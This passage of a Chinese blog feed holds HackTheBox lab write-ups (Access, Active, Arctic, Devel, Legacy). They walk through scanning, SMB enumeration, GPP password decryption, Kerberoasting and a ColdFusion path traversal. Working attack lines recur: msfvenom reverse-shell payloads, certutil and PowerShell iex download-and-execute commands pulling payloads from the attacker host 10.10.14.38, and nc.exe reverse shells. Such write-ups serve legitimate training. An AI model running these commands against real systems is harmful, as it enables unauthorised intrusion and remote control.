src="/2021/03/18/access-hackthebox/4.png" class=""><p>拿到了对应的用户和密码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">security:4Cc3ssC0ntr0ller</span><br></pre></td></tr></table></figure><h3 id="telnet"><a href="#telnet" class="headerlink" title="telnet"></a>telnet</h3><p>telnet可以远程连接，刚好拿到了用户和对应的密码</p><img src="/2021/03/18/access-hackthebox/5.png" class=""><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p><code>C:\Users\Public</code>下有隐藏文件，在desktop下有一个文件，type打开</p><img src="/2021/03/18/access-hackthebox/6.png" class=""><p>可以看到runas,并以管理员的身份在运行<code>Access.exe</code>，所以只要用runas运行反弹shell的命令，就能够提权</p><p>利用<code>nishang</code>的powershell进行提权</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">runas /user:ACCESS\Administrator /savecred <span class="string">"powershell iex(new-object net.webclient).downloadstring('http://10.10.14.38/Invoke-PowerShellTcp.ps1')"</span></span><br></pre></td></tr></table></figure><img src="/2021/03/18/access-hackthebox/7.png" class="">]]></content>
    
    <summary type="html">
    
      &lt;p&gt;telnet&amp;amp;runas&amp;amp;Acces文件解析
    
    </summary>
    
    
    
      <category term="渗透easy" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8Feasy/"/>
    
  </entry>
  
  <entry>
    <title>active-hackthebox</title>
    <link href="http://yoursite.com/2021/03/17/active-hackthebox/"/>
    <id>http://yoursite.com/2021/03/17/active-hackthebox/</id>
    <published>2021-03-17T13:43:37.000Z</published>
    <updated>2021-03-17T15:42:58.636Z</updated>
    
    <content type="html"><![CDATA[<p>第一台涉及到域知识和票据的靶机，好好记录一下<a id="more"></a></p><img src="/2021/03/17/active-hackthebox/8.png" class=""><h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -v -sC -sV -oA nmap/active 10.10.10.100</span><br></pre></td></tr></table></figure><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># Nmap 7.91 scan initiated Wed Mar 17 20:53:46 2021 as: nmap -v -sC -sV -oA nmap/active 10.10.10.100</span></span><br><span class="line">Nmap scan report for 10.10.10.100</span><br><span class="line">Host is up (0.33s latency).</span><br><span class="line">Not shown: 983 closed ports</span><br><span class="line">PORT      STATE SERVICE       VERSION</span><br><span class="line">53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)</span><br><span class="line">| dns-nsid: </span><br><span class="line">|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)</span><br><span class="line">88/tcp    open  tcpwrapped</span><br><span class="line">135/tcp   open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)</span><br><span class="line">445/tcp   open  microsoft-ds?</span><br><span class="line">464/tcp   open  tcpwrapped</span><br><span class="line">593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp   open  tcpwrapped</span><br><span class="line">3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)</span><br><span class="line">3269/tcp  open  tcpwrapped</span><br><span class="line">49152/tcp open  unknown</span><br><span class="line">49153/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49154/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49155/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">49158/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows<span class="emphasis">_server_</span>2008:r2:sp1, cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: 33s</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   2.02: </span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2021-03-17T12:56:47</span><br><span class="line">|<span class="emphasis">_  start_</span>date: 2021-03-16T14:20:36</span><br><span class="line"></span><br><span class="line">Read data files from: /usr/bin/../share/nmap</span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line"><span class="section"># Nmap done at Wed Mar 17 20:56:40 2021 -- 1 IP address (1 host up) scanned in 173.96 seconds</span></span><br></pre></td></tr></table></figure><p>开放了很多的端口，<code>active.htb</code>加入到<code>/etc/hosts</code>中</p><p>Kerberos在88，netbios-ssn在139，ldap在389和3268</p><h3 id="smb枚举"><a href="#smb枚举" class="headerlink" title="smb枚举"></a>smb枚举</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient -L //10.10.10.100</span><br></pre></td></tr></table></figure><img src="/2021/03/17/active-hackthebox/1.png" class=""><p><code>replication</code>文件夹中可能会存放一些临时的票据，尝试查看文件夹中的文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">smbclient -L //10.10.10.100</span><br><span class="line">smb: \&gt; RECURSE ON</span><br><span class="line">smb: \&gt; PROMPT OFF</span><br><span class="line">smb: \&gt; mget *</span><br></pre></td></tr></table></figure><img src="/2021/03/17/active-hackthebox/2.png" class=""><p>关于<a href="https://www.cnblogs.com/backlion/p/6927322.html" target="_blank" rel="noopener">Groups.xml</a></p><p>也就是说Groups.xml里会存储AES密钥</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#Groups.xml</span><br><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Groups</span> <span class="attr">clsid</span>=<span class="string">"&#123;3125E937-EB16-4b4c-9934-544FC6D24D26&#125;"</span>&gt;</span><span class="tag">&lt;<span class="name">User</span> <span class="attr">clsid</span>=<span class="string">"&#123;DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1&#125;"</span> <span class="attr">name</span>=<span class="string">"active.htb\SVC_TGS"</span> <span class="attr">image</span>=<span class="string">"2"</span> <span class="attr">changed</span>=<span class="string">"2018-07-18 20:46:06"</span> <span class="attr">uid</span>=<span class="string">"&#123;EF57DA28-5F69-4530-A59E-AAB58578219D&#125;"</span>&gt;</span><span class="tag">&lt;<span class="name">Properties</span> <span class="attr">action</span>=<span class="string">"U"</span> <span class="attr">newName</span>=<span class="string">""</span> <span class="attr">fullName</span>=<span class="string">""</span> <span class="attr">description</span>=<span class="string">""</span> <span class="attr">cpassword</span>=<span class="string">"edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"</span> <span class="attr">changeLogon</span>=<span class="string">"0"</span> <span class="attr">noChange</span>=<span class="string">"1"</span> <span class="attr">neverExpires</span>=<span class="string">"1"</span> <span class="attr">acctDisabled</span>=<span class="string">"0"</span> <span class="attr">userName</span>=<span class="string">"active.htb\SVC_TGS"</span>/&gt;</span><span class="tag">&lt;/<span class="name">User</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Groups</span>&gt;</span></span><br><span class="line">#userName="active.htb\SVC_TGS"</span><br><span class="line">#cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"</span><br></pre></td></tr></table></figure><p>利用kali自带的<code>gpp-decrypt</code>工具破解</p><img src="/2021/03/17/active-hackthebox/3.png" class=""><h3 id="用户权限"><a href="#用户权限" class="headerlink" title="用户权限"></a>用户权限</h3><p>已经获得了用户账户信息和密码，可以登录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient &#x2F;&#x2F;10.10.10.100&#x2F;Users -U SVC_TGS</span><br></pre></td></tr></table></figure><img src="/2021/03/17/active-hackthebox/4.png" class=""><h3 id="Kerberoasting"><a href="#Kerberoasting" class="headerlink" title="Kerberoasting"></a>Kerberoasting</h3><p>利用[impacket][<a href="https://github.com/SecureAuthCorp/impacket]工具对`Kerberoasting`进行拿票" target="_blank" rel="noopener">https://github.com/SecureAuthCorp/impacket]工具对`Kerberoasting`进行拿票</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 GetUserSPNs.py -request active.htb/SVC_TGS</span><br></pre></td></tr></table></figure><img src="/2021/03/17/active-hackthebox/5.png" class=""><p><code>john</code>进行破解</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john <span class="built_in">hash</span> --wordlist=/usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure><img src="/2021/03/17/active-hackthebox/6.png" class=""><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>继续用<code>impacket</code>工具中的<code>psexec</code>脚本</p><img src="/2021/03/17/active-hackthebox/7.png" class=""><p>这里也可以用msfconsole</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;第一台涉及到域知识和票据的靶机，好好记录一下
    
    </summary>
    
    
    
      <category term="渗透easy" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8Feasy/"/>
    
  </entry>
  
  <entry>
    <title>arctic-hackthebox</title>
    <link href="http://yoursite.com/2021/03/14/arctic-hackthebox/"/>
    <id>http://yoursite.com/2021/03/14/arctic-hackthebox/</id>
    <published>2021-03-14T08:48:48.000Z</published>
    <updated>2021-03-14T12:10:51.302Z</updated>
    
    <content type="html"><![CDATA[<p>easy里算是包含很多知识点的一台靶机，记录一下<a id="more"></a></p><img src="/2021/03/14/arctic-hackthebox/13.png" class=""><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">靶机：10.10.10.11</span><br><span class="line">本机：10.10.14.38</span><br></pre></td></tr></table></figure><h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -v -sC -sV -oA nmap/arctic 10.10.10.11</span><br></pre></td></tr></table></figure><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># Nmap 7.91 scan initiated Sun Mar 14 15:44:37 2021 as: nmap -v -sC -sV -oA nmap/arcic 10.10.10.11</span></span><br><span class="line">Nmap scan report for 10.10.10.11</span><br><span class="line">Host is up (0.33s latency).</span><br><span class="line">Not shown: 997 filtered ports</span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">135/tcp   open  msrpc   Microsoft Windows RPC</span><br><span class="line">8500/tcp  open  fmtp?</span><br><span class="line">49154/tcp open  msrpc   Microsoft Windows RPC</span><br><span class="line">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Read data files from: /usr/bin/../share/nmap</span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line"><span class="section"># Nmap done at Sun Mar 14 15:47:48 2021 -- 1 IP address (1 host up) scanned in 191.16 seconds</span></span><br></pre></td></tr></table></figure><p>8500端口，fmtp，可以访问一下</p><img src="/2021/03/14/arctic-hackthebox/1.png" class=""><p><code>adobe coldfusion 8</code>,找一下相关漏洞信息</p><h3 id="漏洞信息收集"><a href="#漏洞信息收集" class="headerlink" title="漏洞信息收集"></a>漏洞信息收集</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsexploit coldfusion</span><br></pre></td></tr></table></figure><img src="/2021/03/14/arctic-hackthebox/3.png" class=""><p>查看一下存在路径穿越的这个payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit -x multiple/remote/14641.py</span><br></pre></td></tr></table></figure><img src="/2021/03/14/arctic-hackthebox/2.png" class=""><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;10.10.10.11:8500&#x2F;CFIDE&#x2F;administrator&#x2F;enter.cfm?locale&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ColdFusion8&#x2F;lib&#x2F;password.properties%00en</span><br></pre></td></tr></table></figure><img src="/2021/03/14/arctic-hackthebox/4.png" class=""><p>拿到了admin的password，md5解密为<code>happyday</code></p><h3 id="msfvenom"><a href="#msfvenom" class="headerlink" title="msfvenom"></a>msfvenom</h3><p>登录后台之后，找到一个<code>scheduled Tasks</code>，可以上传文件，这里就可以上传shell</p><p>因为<code>coldfusion</code>是java写的，用<code>msfvenom</code>找java的反弹shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -l payloads | grep java </span><br><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.38 LPORT=4444 -f raw -o arcic.jsp</span><br></pre></td></tr></table></figure><img src="/2021/03/14/arctic-hackthebox/5.png" class=""><p>然后定一个计划，写入<code>SERVER SETTINGS</code>下<code>MAPPINGS</code>中给出的路径<code>C:\ColdFusion8\wwwroot\CFIDE</code></p><p>之后访问上传的shell同时监听端口</p><img src="/2021/03/14/arctic-hackthebox/6.png" class=""><p>之后由于提权要用到msfconsole，这里要重新进行windows反弹shell到msfconsole</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.38 LPORT=4443 -f exe -o shell.exe</span><br></pre></td></tr></table></figure><h4 id="certutil-exe"><a href="#certutil-exe" class="headerlink" title="certutil.exe"></a>certutil.exe</h4><p>这是windows的内置程序，可以用于Windows中管理证书，这里可以用于下载远程恶意脚本</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil.exe -urlcache -split -f "http://10.10.14.38/shell.exe" shell.exe</span><br></pre></td></tr></table></figure><img src="/2021/03/14/arctic-hackthebox/7.png" class=""><p>msfconsole中设置payload为<code>windows/meterpreter/reverse_tcp</code>,之前的shell中执行exe文件，接收</p><img src="/2021/03/14/arctic-hackthebox/8.png" class=""><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><img src="/2021/03/14/arctic-hackthebox/9.png" class=""><p>由于meterpreter是x86的，系统是win2008的x64，所以要用到migrate进行绑定为x64的，ps查看进程找一个x64的进行绑定</p><img src="/2021/03/14/arctic-hackthebox/11.png" class=""><p>接着就是用<code>multi/recon/local_exploit_suggester</code>进行系统漏洞检测，应用其中一个payload进行提权</p><img src="/2021/03/14/arctic-hackthebox/12.png" class=""><p>提权成功，拿到system</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;easy里算是包含很多知识点的一台靶机，记录一下
    
    </summary>
    
    
    
      <category term="渗透easy" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8Feasy/"/>
    
  </entry>
  
  <entry>
    <title>devel-hackthebox</title>
    <link href="http://yoursite.com/2021/03/12/devel-hackthebox/"/>
    <id>http://yoursite.com/2021/03/12/devel-hackthebox/</id>
    <published>2021-03-12T07:07:47.000Z</published>
    <updated>2021-03-12T15:41:47.603Z</updated>
    
    <content type="html"><![CDATA[<p>windows，这一台才算是真正有点味道<a id="more"></a></p><img src="/2021/03/12/devel-hackthebox/7.png" class=""><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">靶机：10.10.10.5</span><br><span class="line">本机：10.10.14.38</span><br></pre></td></tr></table></figure><h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -v -sC -sV -oA nmap/devel 10.10.10.5</span><br></pre></td></tr></table></figure><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># Nmap 7.91 scan initiated Fri Mar 12 14:43:01 2021 as: nmap -v -sC -sV -oA nmap/devel 10.10.10.5</span></span><br><span class="line">Nmap scan report for 10.10.10.5</span><br><span class="line">Host is up (0.33s latency).</span><br><span class="line">Not shown: 998 filtered ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">21/tcp open  ftp     Microsoft ftpd</span><br><span class="line">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">| 03-18-17  01:06AM       <span class="xml"><span class="tag">&lt;<span class="name">DIR</span>&gt;</span></span>          aspnet_client</span><br><span class="line">| 03-17-17  04:37PM                  689 iisstart.htm</span><br><span class="line">|_03-17-17  04:37PM               184946 welcome.png</span><br><span class="line">| ftp-syst: </span><br><span class="line">|<span class="emphasis">_  SYST: Windows_</span>NT</span><br><span class="line">80/tcp open  http    Microsoft IIS httpd 7.5</span><br><span class="line">| http-methods: </span><br><span class="line">|   Supported Methods: OPTIONS TRACE GET HEAD POST</span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-server-header: Microsoft-IIS/7.5</span><br><span class="line">|_http-title: IIS7</span><br><span class="line">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Read data files from: /usr/bin/../share/nmap</span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line"><span class="section"># Nmap done at Fri Mar 12 14:43:37 2021 -- 1 IP address (1 host up) scanned in 36.09 seconds</span></span><br></pre></td></tr></table></figure><p>21端口，开放了ftp服务，并且允许匿名登录ftp服务器</p><p>80端口，IIS，windows的常见服务器</p><p>登录ftp，有一张静态图片，访问web界面，显示的正是ftp上的图片，那么可能就是通过上传文件到ftp上，能够通过web界面进行访问，因为是IIS，主要解析aspx文件，找一个aspx的webshell，上传到ftp中进行访问</p><h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><img src="/2021/03/12/devel-hackthebox/1.png" class=""><p>成功执行命令，cmd执行反弹shell</p><p>windows利用<a href="https://github.com/SecureAuthCorp/impacket/tree/master/examples" target="_blank" rel="noopener">smb服务</a>来进行传送文件和执行命令</p><p>下载nc.exe放到本机的共享文件夹中<a href="https://github.com/51x/WHP" target="_blank" rel="noopener">工具下载</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 smbserver.py Share <span class="string">'/opt/windows-CVE'</span></span><br></pre></td></tr></table></figure><p>然后监听一个端口，反弹shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\\10.10.14.38\share\nc.exe -e cmd.exe 10.10.14.38 4444</span><br></pre></td></tr></table></figure><img src="/2021/03/12/devel-hackthebox/2.png" class=""><p>提权待填坑</p><h3 id="msfgetshell"><a href="#msfgetshell" class="headerlink" title="msfgetshell"></a>msfgetshell</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp -f aspx LHOST=10.10.14.38 LPORT=4444 -o shell.aspx</span><br></pre></td></tr></table></figure><p>生成反弹shell的payload，上传到ftp，这里开启msf，设置要启用的msf模块，配置好lhost，然后攻击</p><img src="/2021/03/12/devel-hackthebox/3.png" class=""><p>接着进行提权</p><img src="/2021/03/12/devel-hackthebox/4.png" class=""><p>这个模块能够根据当前的操作系统，文件，会话等给出相应的提权漏洞</p><img src="/2021/03/12/devel-hackthebox/5.png" class=""><p>这里面的所有模块需要逐个尝试，只要是写着能被<code>vulnerable</code>的，用下面图中的这个模块成功提权</p><img src="/2021/03/12/devel-hackthebox/6.png" class="">]]></content>
    
    <summary type="html">
    
      &lt;p&gt;windows，这一台才算是真正有点味道
    
    </summary>
    
    
    
      <category term="渗透easy" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8Feasy/"/>
    
  </entry>
  
  <entry>
    <title>legacy-hackthebox</title>
    <link href="http://yoursite.com/2021/03/12/legacy-hackthebox/"/>
    <id>http://yoursite.com/2021/03/12/legacy-hackthebox/</id>
    <published>2021-03-12T04:50:59.000Z</published>
    <updated>2021-03-12T06:32:47.424Z</updated>
    
    <content type="html"><![CDATA[<p>windows靶机<a id="more"></a></p><img src="/2021/03/12/legacy-hackthebox/4.png" class=""><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">靶机：10.10.10.4</span><br><span class="line">本机：10.10.14.38</span><br></pre></td></tr></table></figure><h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -v -sC -sV -oA nmap/legacy 10.10.10.4</span><br></pre></td></tr></table></figure><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># Nmap 7.91 scan initiated Fri Mar 12 11:53:46 2021 as: nmap -v -sC -sV -oA nmap/legacy 10.10.10.4</span></span><br><span class="line">Nmap scan report for 10.10.10.4</span><br><span class="line">Host is up (0.32s latency).</span><br><span class="line">Not shown: 997 filtered ports</span><br><span class="line">PORT     STATE  SERVICE       VERSION</span><br><span class="line">139/tcp  open   netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">445/tcp  open   microsoft-ds  Windows XP microsoft-ds</span><br><span class="line">3389/tcp closed ms-wbt-server</span><br><span class="line">Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: -3h59m26s, deviation: 1h24m51s, median: -4h59m26s</span><br><span class="line">| nbstat: NetBIOS name: LEGACY, NetBIOS user: <span class="xml"><span class="tag">&lt;<span class="name">unknown</span>&gt;</span></span>, NetBIOS MAC: 00:50:56:b9:43:ef (VMware)</span><br><span class="line">| Names:</span><br><span class="line">|   LEGACY<span class="xml"><span class="tag">&lt;<span class="name">00</span>&gt;</span></span>           Flags: <span class="xml"><span class="tag">&lt;<span class="name">unique</span>&gt;</span></span><span class="xml"><span class="tag">&lt;<span class="name">active</span>&gt;</span></span></span><br><span class="line">|   HTB<span class="xml"><span class="tag">&lt;<span class="name">00</span>&gt;</span></span>              Flags: <span class="xml"><span class="tag">&lt;<span class="name">group</span>&gt;</span></span><span class="xml"><span class="tag">&lt;<span class="name">active</span>&gt;</span></span></span><br><span class="line">|   LEGACY<span class="xml"><span class="tag">&lt;<span class="name">20</span>&gt;</span></span>           Flags: <span class="xml"><span class="tag">&lt;<span class="name">unique</span>&gt;</span></span><span class="xml"><span class="tag">&lt;<span class="name">active</span>&gt;</span></span></span><br><span class="line">|   HTB<span class="xml"><span class="tag">&lt;<span class="name">1e</span>&gt;</span></span>              Flags: <span class="xml"><span class="tag">&lt;<span class="name">group</span>&gt;</span></span><span class="xml"><span class="tag">&lt;<span class="name">active</span>&gt;</span></span></span><br><span class="line">|   HTB<span class="xml"><span class="tag">&lt;<span class="name">1d</span>&gt;</span></span>              Flags: <span class="xml"><span class="tag">&lt;<span class="name">unique</span>&gt;</span></span><span class="xml"><span class="tag">&lt;<span class="name">active</span>&gt;</span></span></span><br><span class="line">|<span class="emphasis">_  \x01\x02_</span><span class="emphasis">_MSBROWSE_</span>_\x02<span class="xml"><span class="tag">&lt;<span class="name">01</span>&gt;</span></span>  Flags: <span class="xml"><span class="tag">&lt;<span class="name">group</span>&gt;</span></span><span class="xml"><span class="tag">&lt;<span class="name">active</span>&gt;</span></span></span><br><span class="line">| smb-os-discovery: </span><br><span class="line">|   OS: Windows XP (Windows 2000 LAN Manager)</span><br><span class="line">|   OS CPE: cpe:/o:microsoft:windows_xp::-</span><br><span class="line">|   Computer name: legacy</span><br><span class="line">|   NetBIOS computer name: LEGACY\x00</span><br><span class="line">|   Workgroup: HTB\x00</span><br><span class="line">|_  System time: 2021-03-12T02:55:00+02:00</span><br><span class="line">| smb-security-mode: </span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|<span class="emphasis">_  message_</span>signing: disabled (dangerous, but default)</span><br><span class="line">|_smb2-time: Protocol negotiation failed (SMB2)</span><br><span class="line"></span><br><span class="line">Read data files from: /usr/bin/../share/nmap</span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line"><span class="section"># Nmap done at Fri Mar 12 11:55:22 2021 -- 1 IP address (1 host up) scanned in 95.48 seconds</span></span><br></pre></td></tr></table></figure><p>445开放端口，老样子扫一下常见的漏洞</p><img src="/2021/03/12/legacy-hackthebox/1.png" class=""><p>有两个可用的，MS08-067,MS17-010</p><h3 id="msfconsole"><a href="#msfconsole" class="headerlink" title="msfconsole"></a>msfconsole</h3><img src="/2021/03/12/legacy-hackthebox/2.png" class=""><p>找到对应的漏洞利用模块之后，只需要更改一下<code>lhost、rhosts</code>,之后可以用check命令检查，这台靶机可能因为漏洞原因不太稳定，可能需要重启才能打通</p><img src="/2021/03/12/legacy-hackthebox/3.png" class=""><p>拿到了shell</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;windows靶机
    
    </summary>
    
    
    
      <category term="渗透easy" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8Feasy/"/>
    
  </entry>
  
  <entry>
    <title>blue-hackthebox</title>
    <link href="http://yoursite.com/2021/03/12/blue-hackthebox/"/>
    <id>http://yoursite.com/2021/03/12/blue-hackthebox/</id>
    <published>2021-03-12T02:19:12.000Z</published>
    <updated>2021-03-12T03:37:39.247Z</updated>
    
